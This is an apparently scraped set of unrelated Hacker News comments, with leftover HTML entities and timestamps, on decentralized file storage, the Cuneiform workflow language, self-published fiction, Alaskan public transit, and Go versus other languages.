It&#x27;s a what they call &quot;Decentralized Software‑Based File Storage Platform&quot;. It reminded me a lot to the Ori file system, which came out about a year or so.<p>Now I was wondering what the main difference between the two is. Does anybody have an experience with both of them, and can write about observed up- and downsides of them?<p>Infinit: http://infinit.sh\nOri: http://ori.scs.stanford.edu",1454669981

Of course, most general purpose languages offer facilities for parallelization and/or distribution. Python has the multiprocessing library. In R there is the parallelMap library. But responsibility over how parallelization is used in such a program still resides with the programmer.<p>This is different in Cuneiform. Everything is automatically parallelized here. Most task applications are relatively large computational pieces of work that run for seconds or minutes (in contrast to, e.g., an addition). In this scenario it makes sense to parallelize wherever possible.<p>Cuneiform allows you to drive any API.<p>Another thing that is difficult in most general purpose programming languages is the incorporation of libraries not written in that particular language. E.g., it is non-trivial to use a Python library in Java. Even calling command line applications requires a small wrapper (os.system() in Python). In Cuneiform this is the normal mode of operation. Writing a wrapper around a Bash script is just as hard as defining a function.",1454668392

It doesn&#x27;t make sense to physically publish a lone short story in paper, and really long stories previously had to either be culled to fit in one binding, or split into a multi-part series. Digital works are <i>less</i> susceptible to this.<p>- It&#x27;s easier to keep up-to-date on my favorite authors when they publish digitally. In some circumstances (writing boards), I get to read each chapter as the writer completes them, rather than waiting until the entire book is complete.<p>In stark contrast to my reading habits from 5 years ago, I now almost exclusively read self-published works. #1 and #2 have led to me reading some stories that were completely different from anything I&#x27;ve ever seen in print form, like some really snarky story told from the point of view of a rock, only he had no opinions or thoughts, because he was a rock. In general, there&#x27;s <i>no</i> cost for experimentation (besides time).<p>Relatedly, I know at least one person who has actually just published their first book in physical form. He only did this <i>after</i> amassing a decent base of fans via his digital publications.<p>These are just my observations. I&#x27;m not necessarily putting one form above the other - I think they actually work pretty well together <i>currently</i>. I see quite a similarity between physical vs digital books and CDs vs digital music downloads. However, the book is intrinsically usable, whereas the CD requires an additional piece of technology to be used.",1454668359

Consider your example contrasting suburban US and Europe. Alaska is to lower 48 burbs what US burbs are to Europe. We have big lots and we have spread out.  So public transit is expensive and it poorly serves us. To compound this difficulty, the majority of villages aren&#x27;t even connected to the road system. The locals get around with snowmobiles and 4wheelers. Those tend to be more clustered but public transit in a town that has no jobs and 100 people living in 2 sq miles is pointless.

I&#x27;d put it under consideration for where I&#x27;d pick Java (an increasingly limited space now for myself), but I really do not think it competes directly with Python/Ruby or C-ABI compatible compiled languages like Rust. It&#x27;s on an island like Java. As a result, you&#x27;re going all-in with Go, but netting a much smaller ecosystem than Java&#x27;s. I prefer to not go all-in with either.<p>If I were to reach for Go for webapps, I&#x27;d be just as if not more inclined to look at Swift as it matures.",1454666924
